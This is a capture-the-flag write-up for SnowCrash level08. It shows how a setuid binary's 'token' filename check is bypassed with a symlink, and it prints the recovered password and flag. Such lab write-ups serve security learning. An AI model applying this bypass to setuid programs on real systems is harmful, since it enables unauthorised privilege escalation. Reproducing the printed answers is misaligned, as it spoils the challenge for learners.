```
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token

level08@SnowCrash:~$ ./level08
./level08 [file to read]

level08@SnowCrash:~$ ./level08 token
You may not access 'token'

level08@SnowCrash:~$ strings level08
...
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
...
```
We guessed that [file to read] is compared to string "token" and if found the file is not read <br />
We can check it using `ltrace` which is a debugging utility in Linux, used to display the calls an application makes to shared libraries:
```
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                                                  = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                                              = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
`strstr` tells us that we were right <br />
We cannot change token's file name but we can create a link to it:
```
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/other
level08@SnowCrash:~$ ls -l /tmp/other
lrwxrwxrwx 1 level08 level08 24 Sep 18 20:04 /tmp/other -> /home/user/level08/token

level08@SnowCrash:~$ ./level08 /tmp/other
quif5eloekouj29ke0vouxean

level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
